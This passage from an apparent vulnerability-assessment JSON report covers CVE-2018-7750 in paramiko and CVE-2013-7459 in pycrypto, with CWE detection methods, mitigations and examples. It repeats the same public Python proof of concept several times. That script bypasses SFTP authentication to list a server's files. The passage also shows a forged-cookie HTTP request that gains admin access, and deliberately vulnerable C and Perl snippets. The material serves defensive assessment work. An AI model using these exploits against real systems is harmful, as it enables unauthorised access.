                      "xhtml:li": "Manual Source Code Review (not inspections)"
                    }
                  }
                },
                "Effectiveness": "SOAR Partial"
              },
              {
                "Method": "Automated Static Analysis - Source Code",
                "Description": {
                  "xhtml:p": "According to SOAR, the following detection techniques may be useful:",
                  "xhtml:div": {
                    "@style": "margin-left:1em;",
                    "xhtml:div": "Cost effective for partial coverage:",
                    "xhtml:ul": {
                      "xhtml:li": [
                        "Source code Weakness Analyzer",
                        "Context-configured Source Code Weakness Analyzer"
                      ]
                    }
                  }
                },
                "Effectiveness": "SOAR Partial"
              },
              {
                "Method": "Automated Static Analysis",
                "Description": {
                  "xhtml:p": "According to SOAR, the following detection techniques may be useful:",
                  "xhtml:div": {
                    "@style": "margin-left:1em;",
                    "xhtml:div": "Cost effective for partial coverage:",
                    "xhtml:ul": {
                      "xhtml:li": "Configuration Checker"
                    }
                  }
                },
                "Effectiveness": "SOAR Partial"
              },
              {
                "Method": "Architecture or Design Review",
                "Description": {
                  "xhtml:p": "According to SOAR, the following detection techniques may be useful:",
                  "xhtml:div": {
                    "@style": "margin-left:1em;",
                    "xhtml:div": "Highly cost effective:",
                    "xhtml:ul": {
                      "xhtml:li": [
                        "Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)",
                        "Formal Methods / Correct-By-Construction"
                      ]
                    }
                  }
                },
                "Effectiveness": "High"
              }
            ],
            "potential_mitigations": {
              "Phase": "Architecture and Design",
              "Strategy": "Libraries or Frameworks",
              "Description": "Use an authentication framework or library such as the OWASP ESAPI Authentication feature."
            },
            "demonstrative_examples": [
              {
                "Intro_Text": "The following code intends to ensure that the user is already logged in. If not, the code performs authentication with the user-provided username and password. If successful, it sets the loggedin and user cookies to \"remember\" that the user has already logged in. Finally, the code performs administrator tasks if the logged-in user has the \"Administrator\" username, as recorded in the user cookie.",
                "Example_Code": [
                  {
                    "@Nature": "Bad",
                    "@Language": "Perl",
                    "xhtml:div": {
                      "xhtml:br": [
                        null,
                        null,
                        null,
                        null
                      ],
                      "xhtml:div": [
                        {
                          "@style": "margin-left:1em;",
                          "xhtml:div": {
                            "xhtml:div": [
                              {
                                "@style": "margin-left:1em;",
                                "#text": "ExitError(\"Error: you need to log in first\");"
                              },
                              {
                                "@style": "margin-left:1em;",
                                "xhtml:div": {
                                  "xhtml:br": [
                                    null,
                                    null
                                  ],
                                  "xhtml:div": [
                                    {
                                      "@style": "margin-left:1em;",
                                      "xhtml:br": [
                                        null,
                                        null
                                      ],
                                      "#text": "-name => 'loggedin',-value => 'true');"
                                    },
                                    {
                                      "@style": "margin-left:1em;",
                                      "xhtml:br": [
                                        null,
                                        null
                                      ],
                                      "#text": "-name => 'user',-value => $q->param('username'));"
                                    }
                                  ],
                                  "#text": "# Set loggedin and user cookies.$q->cookie(\n                                 $q->cookie("
                                }
                              }
                            ],
                            "xhtml:br": null,
                            "#text": "if (! AuthenticateUser($q->param('username'), $q->param('password'))) {}else {}"
                          }
                        },
                        {
                          "@style": "margin-left:1em;",
                          "#text": "DoAdministratorTasks();"
                        }
                      ],
                      "#text": "my $q = new CGI;\n                     if ($q->cookie('loggedin') ne \"true\") {}\n                     if ($q->cookie('user') eq \"Administrator\") {}"
                    }
                  },
                  {
                    "@Nature": "Attack",
                    "xhtml:div": {
                      "xhtml:br": [
                        null,
                        null,
                        null,
                        null
                      ],
                      "#text": "GET /cgi-bin/vulnerable.cgi HTTP/1.1Cookie: user=AdministratorCookie: loggedin=true\n                     [body of request]"
                    }
                  }
                ],
                "Body_Text": [
                  "Unfortunately, this code can be bypassed. The attacker can set the cookies independently so that the code does not check the username and password. The attacker could do this with an HTTP request containing headers such as:",
                  "By setting the loggedin cookie to \"true\", the attacker bypasses the entire authentication check. By using the \"Administrator\" value in the user cookie, the attacker also gains privileges to administer the software."
                ]
              },
              {
                "@Demonstrative_Example_ID": "DX-117",
                "Intro_Text": "In January 2009, an attacker was able to gain administrator access to a Twitter server because the server did not restrict the number of login attempts [REF-236]. The attacker targeted a member of Twitter's support team and was able to successfully guess the member's password using a brute force attack by guessing a large number of common words. After gaining access as the member of the support staff, the attacker used the administrator panel to gain access to 33 accounts that belonged to celebrities and politicians. Ultimately, fake Twitter messages were sent that appeared to come from the compromised accounts.",
                "References": {
                  "Reference": {
                    "@External_Reference_ID": "REF-236"
                  }
                }
              },
              {
                "@Demonstrative_Example_ID": "DX-153",
                "Intro_Text": "In 2022, the OT:ICEFALL study examined products by 10 different Operational Technology (OT) vendors. The researchers reported 56 vulnerabilities and said that the products were \"insecure by design\" [REF-1283]. If exploited, these vulnerabilities often allowed adversaries to change how the products operated, ranging from denial of service to changing the code that the products executed. Since these products were often used in industries such as power, electrical, water, and others, there could even be safety implications.",
                "Body_Text": "Multiple vendors did not use any authentication or used client-side authentication for critical functionality in their OT products."
              }
            ]
          }
        ]
      },
      "reachable_code": [
        {
          "path_to_file": "vulnerability_assisting_information/main/files/paramiko_test.py",
          "used_artifacts": [
            {
              "artifact_name": "Transport",
              "used_in_lines": [
                3,
                21
              ]
            }
          ]
        }
      ],
      "exploits": [
        {
          "@id": "https://www.exploit-db.com/exploits/45748",
          "description": "",
          "payload": "# Exploit Title: Nutanix AOS & Prism - SFTP Authentication Bypass\r\n# Date: 2018-10-27\r\n# Exploit Author: Adam Brown\r\n# Vendor Homepage: https://www.nutanix.org\r\n# Software Link: https://www.nutanix.com/products/software-options/\r\n# Version: < 5.5.5 (LTS), < 5.8.1 (STS)\r\n# Tested on: Acropolis Operating System\r\n# CVE : Related to CVE-2018-7750\r\n#\r\n# This PoC is based on discussions found at the following blog post:\r\n#   https://coffeegist.com/security/paramiko-ssh-authentication-bypass-in-nutanix/\r\n# TLDR, the Acropolis SFTP server doesn't check if the client has completed the\r\n# authentication step before allowing the client to open channels. The PoC below\r\n# connects to the acropolis SFTP server, and lists the root directory without\r\n# authenticating.\r\n\r\n#!/usr/bin/python\r\nimport paramiko\r\n\r\nhost = '127.0.0.1'\r\nport = 2222\r\n\r\ntrans = paramiko.Transport((host, port))\r\ntrans.start_client()\r\n\r\n# If the call below is skipped, no username or password is required.\r\n# trans.auth_password('username', 'password')\r\n\r\nsftp = paramiko.SFTPClient.from_transport(trans)\r\nprint(sftp.listdir('/'))\r\nsftp.close()"
        },
        {
          "@id": "https://www.exploit-db.com/exploits/45712",
          "description": "",
          "payload": "# Exploit Title: Paramiko 2.4.1 - Authentication Bypass\r\n# Date: 2018-10-27\r\n# Exploit Author: Adam Brown\r\n# Vendor Homepage: https://www.paramiko.org\r\n# Software Link: https://github.com/paramiko/paramiko/tree/v1.15.2\r\n# Version: < 1.17.6, 1.18.x < 1.18.5, 2.0.x < 2.0.8, 2.1.x < 2.1.5, 2.2.x < 2.2.3, 2.3.x < 2.3.2, and 2.4.x < 2.4.1\r\n# Tested on: Multiple\r\n# CVE : CVE-2018-7750\r\n\r\n# This PoC is based on discussions found at the following github issue:\r\n# https://github.com/paramiko/paramiko/issues/1175\r\n# TLDR, Paramiko doesn't check if the client has completed the authentication step\r\n# before allowing the client to open channels. The PoC below connects to an SFTP\r\n# server, and lists the root directory without authenticating. Slight modification\r\n# is required if you want to open an SSH channel.\r\n\r\n#!/usr/bin/python\r\nimport paramiko\r\n\r\nhost = '127.0.0.1'\r\nport = 22\r\n\r\ntrans = paramiko.Transport((host, port))\r\ntrans.start_client()\r\n\r\n# If the call below is skipped, no username or password is required.\r\n# trans.auth_password('username', 'password')\r\n\r\nsftp = paramiko.SFTPClient.from_transport(trans)\r\nprint(sftp.listdir('/'))\r\nsftp.close()"
        },
        {
          "@id": "Unknown",
          "description": "\nNutanix AOS  Prism  5.5.5 (LTS)   5.8.1 (STS) - SFTP Authentication Bypass",
          "payload": "# Exploit Title: Nutanix AOS & Prism - SFTP Authentication Bypass\n# Date: 2018-10-27\n# Exploit Author: Adam Brown\n# Vendor Homepage: https://www.nutanix.org\n# Software Link: https://www.nutanix.com/products/software-options/\n# Version: < 5.5.5 (LTS), < 5.8.1 (STS)\n# Tested on: Acropolis Operating System\n# CVE : Related to CVE-2018-7750\n#\n# This PoC is based on discussions found at the following blog post:\n#   https://coffeegist.com/security/paramiko-ssh-authentication-bypass-in-nutanix/\n# TLDR, the Acropolis SFTP server doesn't check if the client has completed the\n# authentication step before allowing the client to open channels. The PoC below\n# connects to the acropolis SFTP server, and lists the root directory without\n# authenticating.\n\n#!/usr/bin/python\nimport paramiko\n\nhost = '127.0.0.1'\nport = 2222\n\ntrans = paramiko.Transport((host, port))\ntrans.start_client()\n\n# If the call below is skipped, no username or password is required.\n# trans.auth_password('username', 'password')\n\nsftp = paramiko.SFTPClient.from_transport(trans)\nprint(sftp.listdir('/'))\nsftp.close()"
        },
        {
          "@id": "Unknown",
          "description": "\nParamiko 2.4.1 - Authentication Bypass",
          "payload": "# Exploit Title: Paramiko 2.4.1 - Authentication Bypass\n# Date: 2018-10-27\n# Exploit Author: Adam Brown\n# Vendor Homepage: https://www.paramiko.org\n# Software Link: https://github.com/paramiko/paramiko/tree/v1.15.2\n# Version: < 1.17.6, 1.18.x < 1.18.5, 2.0.x < 2.0.8, 2.1.x < 2.1.5, 2.2.x < 2.2.3, 2.3.x < 2.3.2, and 2.4.x < 2.4.1\n# Tested on: Multiple\n# CVE : CVE-2018-7750\n\n# This PoC is based on discussions found at the following github issue:\n# https://github.com/paramiko/paramiko/issues/1175\n# TLDR, Paramiko doesn't check if the client has completed the authentication step\n# before allowing the client to open channels. The PoC below connects to an SFTP\n# server, and lists the root directory without authenticating. Slight modification\n# is required if you want to open an SSH channel.\n\n#!/usr/bin/python\nimport paramiko\n\nhost = '127.0.0.1'\nport = 22\n\ntrans = paramiko.Transport((host, port))\ntrans.start_client()\n\n# If the call below is skipped, no username or password is required.\n# trans.auth_password('username', 'password')\n\nsftp = paramiko.SFTPClient.from_transport(trans)\nprint(sftp.listdir('/'))\nsftp.close()"
        },
        {
          "@id": "https://packetstormsecurity.com/files/149983/Paramiko-2.4.1-Authentication-Bypass.html",
          "description": "",
          "payload": "`# Exploit Title: Paramiko 2.4.1 - Authentication Bypass  \n# Date: 2018-10-27  \n# Exploit Author: Adam Brown  \n# Vendor Homepage: https://www.paramiko.org  \n# Software Link: https://github.com/paramiko/paramiko/tree/v1.15.2  \n# Version: < 1.17.6, 1.18.x < 1.18.5, 2.0.x < 2.0.8, 2.1.x < 2.1.5, 2.2.x < 2.2.3, 2.3.x < 2.3.2, and 2.4.x < 2.4.1  \n# Tested on: Multiple  \n# CVE : CVE-2018-7750  \n  \n# This PoC is based on discussions found at the following github issue:  \n# https://github.com/paramiko/paramiko/issues/1175  \n# TLDR, Paramiko doesn't check if the client has completed the authentication step  \n# before allowing the client to open channels. The PoC below connects to an SFTP  \n# server, and lists the root directory without authenticating. Slight modification  \n# is required if you want to open an SSH channel.  \n  \n#!/usr/bin/python  \nimport paramiko  \n  \nhost = '127.0.0.1'  \nport = 22  \n  \ntrans = paramiko.Transport((host, port))  \ntrans.start_client()  \n  \n# If the call below is skipped, no username or password is required.  \n# trans.auth_password('username', 'password')  \n  \nsftp = paramiko.SFTPClient.from_transport(trans)  \nprint(sftp.listdir('/'))  \nsftp.close()  \n  \n`\n"
        },
        {
          "@id": "https://packetstormsecurity.com/files/150020/Nutanix-AOS-And-Prism-SFTP-Authentication-Bypass.html",
          "description": "",
          "payload": "`# Exploit Title: Nutanix AOS & Prism - SFTP Authentication Bypass  \n# Date: 2018-10-27  \n# Exploit Author: Adam Brown  \n# Vendor Homepage: https://www.nutanix.org  \n# Software Link: https://www.nutanix.com/products/software-options/  \n# Version: < 5.5.5 (LTS), < 5.8.1 (STS)  \n# Tested on: Acropolis Operating System  \n# CVE : Related to CVE-2018-7750  \n#  \n# This PoC is based on discussions found at the following blog post:  \n# https://coffeegist.com/security/paramiko-ssh-authentication-bypass-in-nutanix/  \n# TLDR, the Acropolis SFTP server doesn't check if the client has completed the  \n# authentication step before allowing the client to open channels. The PoC below  \n# connects to the acropolis SFTP server, and lists the root directory without  \n# authenticating.  \n  \n#!/usr/bin/python  \nimport paramiko  \n  \nhost = '127.0.0.1'  \nport = 2222  \n  \ntrans = paramiko.Transport((host, port))  \ntrans.start_client()  \n  \n# If the call below is skipped, no username or password is required.  \n# trans.auth_password('username', 'password')  \n  \nsftp = paramiko.SFTPClient.from_transport(trans)  \nprint(sftp.listdir('/'))  \nsftp.close()  \n  \n  \n`\n"
        },
        {
          "@id": "https://0day.today/exploit/description/31454",
          "description": "",
          "payload": "# Exploit Title: Paramiko 2.4.1 - Authentication Bypass\n# Exploit Author: Adam Brown\n# Vendor Homepage: https://www.paramiko.org\n# Software Link: https://github.com/paramiko/paramiko/tree/v1.15.2\n# Version: < 1.17.6, 1.18.x < 1.18.5, 2.0.x < 2.0.8, 2.1.x < 2.1.5, 2.2.x < 2.2.3, 2.3.x < 2.3.2, and 2.4.x < 2.4.1\n# Tested on: Multiple\n# CVE : CVE-2018-7750\n \n# This PoC is based on discussions found at the following github issue:\n# https://github.com/paramiko/paramiko/issues/1175\n# TLDR, Paramiko doesn't check if the client has completed the authentication step\n# before allowing the client to open channels. The PoC below connects to an SFTP\n# server, and lists the root directory without authenticating. Slight modification\n# is required if you want to open an SSH channel.\n \n#!/usr/bin/python\nimport paramiko\n \nhost = '127.0.0.1'\nport = 22\n \ntrans = paramiko.Transport((host, port))\ntrans.start_client()\n \n# If the call below is skipped, no username or password is required.\n# trans.auth_password('username', 'password')\n \nsftp = paramiko.SFTPClient.from_transport(trans)\nprint(sftp.listdir('/'))\nsftp.close()\n"
        },
        {
          "@id": "https://0day.today/exploit/description/31461",
          "description": "",
          "payload": "# Exploit Title: Nutanix AOS & Prism - SFTP Authentication Bypass\n# Exploit Author: Adam Brown\n# Vendor Homepage: https://www.nutanix.org\n# Software Link: https://www.nutanix.com/products/software-options/\n# Version: < 5.5.5 (LTS), < 5.8.1 (STS)\n# Tested on: Acropolis Operating System\n# CVE : Related to CVE-2018-7750\n#\n# This PoC is based on discussions found at the following blog post:\n#   https://coffeegist.com/security/paramiko-ssh-authentication-bypass-in-nutanix/\n# TLDR, the Acropolis SFTP server doesn't check if the client has completed the\n# authentication step before allowing the client to open channels. The PoC below\n# connects to the acropolis SFTP server, and lists the root directory without\n# authenticating.\n \n#!/usr/bin/python\nimport paramiko\n \nhost = '127.0.0.1'\nport = 2222\n \ntrans = paramiko.Transport((host, port))\ntrans.start_client()\n \n# If the call below is skipped, no username or password is required.\n# trans.auth_password('username', 'password')\n \nsftp = paramiko.SFTPClient.from_transport(trans)\nprint(sftp.listdir('/'))\nsftp.close()\n"
        }
      ],
      "priority": 7.13
    },
    {
      "affected_component": "pycrypto",
      "affected_component_version": "2.0.1",
      "vulnerability": {
        "@id": "https://nvd.nist.gov/vuln/detail/CVE-2013-7459",
        "name": "CVE-2013-7459",
        "description": "Heap-based buffer overflow in the ALGnew function in block_templace.c in Python Cryptography Toolkit (aka pycrypto) allows remote attackers to execute arbitrary code as demonstrated by a crafted iv parameter to cryptmsg.py.",
        "cvss": {
          "vuln_impact": 5.9,
          "attack_vector": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
        },
        "cwes": [
          {
            "@id": "https://cwe.mitre.org/data/definitions/119.html",
            "name": "119",
            "description": {
              "xhtml:p": [
                "Certain languages allow direct addressing of memory locations and do not automatically ensure that these locations are valid for the memory buffer that is being referenced. This can cause read or write operations to be performed on memory locations that may be associated with other variables, data structures, or internal program data.",
                "As a result, an attacker may be able to execute arbitrary code, alter the intended control flow, read sensitive information, or cause the system to crash."
              ]
            },
            "consequences": [
              {
                "Scope": [
                  "Integrity",
                  "Confidentiality",
                  "Availability"
                ],
                "Impact": [
                  "Execute Unauthorized Code or Commands",
                  "Modify Memory"
                ],
                "Note": "If the memory accessible by the attacker can be effectively controlled, it may be possible to execute arbitrary code, as with a standard buffer overflow. If the attacker can overwrite a pointer's worth of memory (usually 32 or 64 bits), they can redirect a function pointer to their own malicious code. Even when the attacker can only modify a single byte arbitrary code execution can be possible. Sometimes this is because the same problem can be exploited repeatedly to the same effect. Other times it is because the attacker can overwrite security-critical application-specific data -- such as a flag indicating whether the user is an administrator."
              },
              {
                "Scope": [
                  "Availability",
                  "Confidentiality"
                ],
                "Impact": [
                  "Read Memory",
                  "DoS: Crash, Exit, or Restart",
                  "DoS: Resource Consumption (CPU)",
                  "DoS: Resource Consumption (Memory)"
                ],
                "Note": "Out of bounds memory access will very likely result in the corruption of relevant memory, and perhaps instructions, possibly leading to a crash. Other attacks leading to lack of availability are possible, including putting the program into an infinite loop."
              },
              {
                "Scope": "Confidentiality",
                "Impact": "Read Memory",
                "Note": "In the case of an out-of-bounds read, the attacker may have access to sensitive information. If the sensitive information contains system details, such as the current buffers position in memory, this knowledge can be used to craft further attacks, possibly with more severe consequences."
              }
            ],
            "detection_methods": [
              {
                "@Detection_Method_ID": "DM-1",
                "Method": "Automated Static Analysis",
                "Description": {
                  "xhtml:p": [
                    "This weakness can often be detected using automated static analysis tools. Many modern tools use data flow analysis or constraint-based techniques to minimize the number of false positives.",
                    "Automated static analysis generally does not account for environmental considerations when reporting out-of-bounds memory operations. This can make it difficult for users to determine which warnings should be investigated first. For example, an analysis tool might report buffer overflows that originate from command line arguments in a program that is not expected to run with setuid or other special privileges."
                  ]
                },
                "Effectiveness": "High",
                "Effectiveness_Notes": "Detection techniques for buffer-related errors are more mature than for most other weakness types."
              },
              {
                "@Detection_Method_ID": "DM-2",
                "Method": "Automated Dynamic Analysis",
                "Description": "This weakness can be detected using dynamic tools and techniques that interact with the software using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The software's operation may slow down, but it should not become unstable, crash, or generate incorrect results."
              },
              {
                "Method": "Automated Static Analysis - Binary or Bytecode",
                "Description": {
                  "xhtml:p": "According to SOAR, the following detection techniques may be useful:",
                  "xhtml:div": {
                    "@style": "margin-left:1em;",
                    "xhtml:div": "Cost effective for partial coverage:",
                    "xhtml:ul": {
                      "xhtml:li": [
                        "Binary / Bytecode Quality Analysis",
                        "Bytecode Weakness Analysis - including disassembler + source code weakness analysis",
                        "Binary Weakness Analysis - including disassembler + source code weakness analysis"
                      ]
                    }
                  }
                },
                "Effectiveness": "SOAR Partial"
              },
              {
                "Method": "Manual Static Analysis - Binary or Bytecode",
                "Description": {
                  "xhtml:p": "According to SOAR, the following detection techniques may be useful:",
                  "xhtml:div": {
                    "@style": "margin-left:1em;",
                    "xhtml:div": "Cost effective for partial coverage:",
                    "xhtml:ul": {
                      "xhtml:li": "Binary / Bytecode disassembler - then use manual analysis for vulnerabilities & anomalies"
                    }
                  }
                },
                "Effectiveness": "SOAR Partial"
              },
              {
                "Method": "Dynamic Analysis with Automated Results Interpretation",
                "Description": {
                  "xhtml:p": "According to SOAR, the following detection techniques may be useful:",
                  "xhtml:div": {
                    "@style": "margin-left:1em;",
                    "xhtml:div": "Cost effective for partial coverage:",
                    "xhtml:ul": {
                      "xhtml:li": [
                        "Web Application Scanner",
                        "Web Services Scanner",
                        "Database Scanners"
                      ]
                    }
                  }
                },
                "Effectiveness": "SOAR Partial"
              },
              {
                "Method": "Dynamic Analysis with Manual Results Interpretation",
                "Description": {
                  "xhtml:p": "According to SOAR, the following detection techniques may be useful:",
                  "xhtml:div": {
                    "@style": "margin-left:1em;",
                    "xhtml:div": "Cost effective for partial coverage:",
                    "xhtml:ul": {
                      "xhtml:li": [
                        "Fuzz Tester",
                        "Framework-based Fuzzer"
                      ]
                    }
                  }
                },
                "Effectiveness": "SOAR Partial"
              },
              {
                "Method": "Manual Static Analysis - Source Code",
                "Description": {
                  "xhtml:p": "According to SOAR, the following detection techniques may be useful:",
                  "xhtml:div": {
                    "@style": "margin-left:1em;",
                    "xhtml:div": "Cost effective for partial coverage:",
                    "xhtml:ul": {
                      "xhtml:li": [
                        "Focused Manual Spotcheck - Focused manual analysis of source",
                        "Manual Source Code Review (not inspections)"
                      ]
                    }
                  }
                },
                "Effectiveness": "SOAR Partial"
              },
              {
                "Method": "Automated Static Analysis - Source Code",
                "Description": {
                  "xhtml:p": "According to SOAR, the following detection techniques may be useful:",
                  "xhtml:div": {
                    "@style": "margin-left:1em;",
                    "xhtml:div": [
                      "Highly cost effective:",
                      "Cost effective for partial coverage:"
                    ],
                    "xhtml:ul": [
                      {
                        "xhtml:li": [
                          "Source code Weakness Analyzer",
                          "Context-configured Source Code Weakness Analyzer"
                        ]
                      },
                      {
                        "xhtml:li": "Source Code Quality Analyzer"
                      }
                    ]
                  }
                },
                "Effectiveness": "High"
              },
              {
                "Method": "Architecture or Design Review",
                "Description": {
                  "xhtml:p": "According to SOAR, the following detection techniques may be useful:",
                  "xhtml:div": {
                    "@style": "margin-left:1em;",
                    "xhtml:div": [
                      "Highly cost effective:",
                      "Cost effective for partial coverage:"
                    ],
                    "xhtml:ul": [
                      {
                        "xhtml:li": "Formal Methods / Correct-By-Construction"
                      },
                      {
                        "xhtml:li": "Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)"
                      }
                    ]
                  }
                },
                "Effectiveness": "High"
              }
            ],
            "potential_mitigations": [
              {
                "@Mitigation_ID": "MIT-3",
                "Phase": "Requirements",
                "Strategy": "Language Selection",
                "Description": {
                  "xhtml:p": [
                    "Use a language that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.",
                    "For example, many languages that perform their own memory management, such as Java and Perl, are not subject to buffer overflows. Other languages, such as Ada and C#, typically provide overflow protection, but the protection can be disabled by the programmer.",
                    "Be wary that a language's interface to native code may still be subject to overflows, even if the language itself is theoretically safe."
                  ]
                }
              },
              {
                "@Mitigation_ID": "MIT-4.1",
                "Phase": "Architecture and Design",
                "Strategy": "Libraries or Frameworks",
                "Description": {
                  "xhtml:p": [
                    "Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.",
                    "Examples include the Safe C String Library (SafeStr) by Messier and Viega [REF-57], and the Strsafe.h library from Microsoft [REF-56]. These libraries provide safer versions of overflow-prone string-handling functions."
                  ]
                },
                "Effectiveness_Notes": "This is not a complete solution, since many buffer overflows are not related to strings."
              },
              {
                "@Mitigation_ID": "MIT-10",
                "Phase": [
                  "Operation",
                  "Build and Compilation"
                ],
                "Strategy": "Environment Hardening",
                "Description": {
                  "xhtml:p": [
                    "Use automatic buffer overflow detection mechanisms that are offered by certain compilers or compiler extensions. Examples include: the Microsoft Visual Studio /GS flag, Fedora/Red Hat FORTIFY_SOURCE GCC flag, StackGuard, and ProPolice, which provide various mechanisms including canary-based detection and range/index checking.",
                    "D3-SFCV (Stack Frame Canary Validation) from D3FEND [REF-1334] discusses canary-based detection in detail."
                  ]
                },
                "Effectiveness": "Defense in Depth",
                "Effectiveness_Notes": {
                  "xhtml:p": "This is not necessarily a complete solution, since these mechanisms only detect certain types of overflows. In addition, the result is still a denial of service, since the typical response is to exit the application."
                }
              },
              {
                "@Mitigation_ID": "MIT-9",
                "Phase": "Implementation",
                "Description": {
                  "xhtml:p": "Consider adhering to the following rules when allocating and managing an application's memory:",
                  "xhtml:ul": {
                    "xhtml:li": [
                      "Double check that the buffer is as large as specified.",
                      "When using functions that accept a number of bytes to copy, such as strncpy(), be aware that if the destination buffer size is equal to the source buffer size, it may not NULL-terminate the string.",
                      "Check buffer boundaries if accessing the buffer in a loop and make sure there is no danger of writing past the allocated space.",
                      "If necessary, truncate all input strings to a reasonable length before passing them to the copy and concatenation functions."
                    ]
                  }
                }
              },
              {
                "@Mitigation_ID": "MIT-11",
                "Phase": [
                  "Operation",
                  "Build and Compilation"
                ],
                "Strategy": "Environment Hardening",
                "Description": {
                  "xhtml:p": [
                    "Run or compile the software using features or extensions that randomly arrange the positions of a program's executable and libraries in memory. Because this makes the addresses unpredictable, it can prevent an attacker from reliably jumping to exploitable code.",
                    "Examples include Address Space Layout Randomization (ASLR) [REF-58] [REF-60] and Position-Independent Executables (PIE) [REF-64]. Imported modules may be similarly realigned if their default memory addresses conflict with other modules, in a process known as \"rebasing\" (for Windows) and \"prelinking\" (for Linux) [REF-1332] using randomly generated addresses. ASLR for libraries cannot be used in conjunction with prelink since it would require relocating the libraries at run-time, defeating the whole purpose of prelinking.",
                    "For more information on these techniques see D3-SAOR (Segment Address Offset Randomization) from D3FEND [REF-1335]."
                  ]
                },
                "Effectiveness": "Defense in Depth",
                "Effectiveness_Notes": "These techniques do not provide a complete solution.  For instance, exploits frequently use a bug that discloses memory addresses in order to maximize reliability of code execution [REF-1337]. It has also been shown that a side-channel attack can bypass ASLR [REF-1333]"
              },
              {
                "@Mitigation_ID": "MIT-12",
                "Phase": "Operation",
                "Strategy": "Environment Hardening",
                "Description": {
                  "xhtml:p": [
                    "Use a CPU and operating system that offers Data Execution Protection (using hardware NX or XD bits) or the equivalent techniques that simulate this feature in software, such as PaX [REF-60] [REF-61]. These techniques ensure that any instruction executed is exclusively at a memory address that is part of the code segment.",
                    "For more information on these techniques see D3-PSEP (Process Segment Execution Prevention) from D3FEND [REF-1336]."
                  ]
                },
                "Effectiveness": "Defense in Depth",
                "Effectiveness_Notes": "This is not a complete solution, since buffer overflows could be used to overwrite nearby variables to modify the software's state in dangerous ways. In addition, it cannot be used in cases in which self-modifying code is required. Finally, an attack could still cause a denial of service, since the typical response is to exit the application."
              },
              {
                "@Mitigation_ID": "MIT-13",
                "Phase": "Implementation",
                "Description": "Replace unbounded copy functions with analogous functions that support length arguments, such as strcpy with strncpy. Create these if they are not available.",
                "Effectiveness": "Moderate",
                "Effectiveness_Notes": "This approach is still susceptible to calculation errors, including issues such as off-by-one errors (CWE-193) and incorrectly calculating buffer lengths (CWE-131)."
              }
            ],
            "demonstrative_examples": [
              {
                "@Demonstrative_Example_ID": "DX-1",
                "Intro_Text": "This example takes an IP address from a user, verifies that it is well formed and then looks up the hostname and copies it into a buffer.",
                "Example_Code": {
                  "@Nature": "Bad",
                  "@Language": "C",
                  "xhtml:div": {
                    "xhtml:div": {
                      "@style": "margin-left:1em;",
                      "xhtml:div": {
                        "xhtml:br": [
                          null,
                          null,
                          null,
                          null,
                          null,
                          null,
                          null,
                          null,
                          null,
                          null
                        ],
                        "xhtml:i": "/*routine that ensures user_supplied_addr is in the right format for conversion */",
                        "#text": "struct hostent *hp;in_addr_t *addr;char hostname[64];in_addr_t inet_addr(const char *cp);\n                           \n                           \n                           \n                           validate_addr_form(user_supplied_addr);addr = inet_addr(user_supplied_addr);hp = gethostbyaddr( addr, sizeof(struct in_addr), AF_INET);strcpy(hostname, hp->h_name);"
                      }
                    },
                    "#text": "void host_lookup(char *user_supplied_addr){}"
                  }
                },
                "Body_Text": [
                  "This function allocates a buffer of 64 bytes to store the hostname, however there is no guarantee that the hostname will not be larger than 64 bytes. If an attacker specifies an address which resolves to a very large hostname, then the function may overwrite sensitive data or even relinquish control flow to the attacker.",
                  "Note that this example also contains an unchecked return value (CWE-252) that can lead to a NULL pointer dereference (CWE-476)."
                ]
              },
              {
                "@Demonstrative_Example_ID": "DX-19",
                "Intro_Text": "This example applies an encoding procedure to an input string and stores it into a buffer.",
                "Example_Code": {
                  "@Nature": "Bad",
                  "@Language": "C",
                  "xhtml:div": {
                    "xhtml:div": {
                      "@style": "margin-left:1em;",
                      "xhtml:div": {
                        "xhtml:br": [
                          null,
                          null,
                          null,
                          null,
                          null
                        ],
                        "xhtml:div": [
                          {
                            "@style": "margin-left:1em;",
                            "#text": "die(\"user string too long, die evil hacker!\");"
                          },
                          {
                            "@style": "margin-left:1em;",
                            "xhtml:div": {
                              "xhtml:div": [
                                {
                                  "@style": "margin-left:1em;",
                                  "xhtml:br": [
                                    null,
                                    null,
                                    null,
                                    null
                                  ],
                                  "#text": "dst_buf[dst_index++] = '&';dst_buf[dst_index++] = 'a';dst_buf[dst_index++] = 'm';dst_buf[dst_index++] = 'p';dst_buf[dst_index++] = ';';"
                                },
                                {
                                  "@style": "margin-left:1em;",
                                  "xhtml:i": "/* encode to &lt; */",
                                  "xhtml:br": null
                                }
                              ],
                              "xhtml:br": [
                                null,
                                null
                              ],
                              "#text": "if( '&' == user_supplied_string[i] ){}else if ('<' == user_supplied_string[i] ){}else dst_buf[dst_index++] = user_supplied_string[i];"
                            }
                          }
                        ],
                        "#text": "int i, dst_index;char *dst_buf = (char*)malloc(4*sizeof(char) * MAX_SIZE);if ( MAX_SIZE <= strlen(user_supplied_string) ){}dst_index = 0;for ( i = 0; i < strlen(user_supplied_string); i++ ){}return dst_buf;"
                      }
                    },
                    "#text": "char * copy_input(char *user_supplied_string){}"
                  }
                },
                "Body_Text": "The programmer attempts to encode the ampersand character in the user-controlled string, however the length of the string is validated before the encoding procedure is applied. Furthermore, the programmer assumes encoding expansion will only expand a given character by a factor of 4, while the encoding of the ampersand expands by 5. As a result, when the encoding procedure expands the string it is possible to overflow the destination buffer if the attacker provides a string of many ampersands."
              },
              {
                "@Demonstrative_Example_ID": "DX-90",
                "Intro_Text": "The following example asks a user for an offset into an array to select an item.",
                "Example_Code": {
                  "@Nature": "Bad",
                  "@Language": "C",
                  "xhtml:div": {
                    "xhtml:br": null,
                    "xhtml:div": {
                      "@style": "margin-left:1em;",
                      "xhtml:br": [
                        null,
                        null
                      ],
                      "#text": "char *items[] = {\"boat\", \"car\", \"truck\", \"train\"};int index = GetUntrustedOffset();printf(\"You selected %s\\n\", items[index-1]);"
                    },
                    "#text": "int main (int argc, char **argv) {}"
                  }
                },
                "Body_Text": "The programmer allows the user to specify which element in the list to select, however an attacker can provide an out-of-bounds offset, resulting in a buffer over-read (CWE-126)."
              },
              {
                "@Demonstrative_Example_ID": "DX-100",
                "Intro_Text": "In the following code, the method retrieves a value from an array at a specific array index location that is given as an input parameter to the method",
                "Example_Code": [
                  {
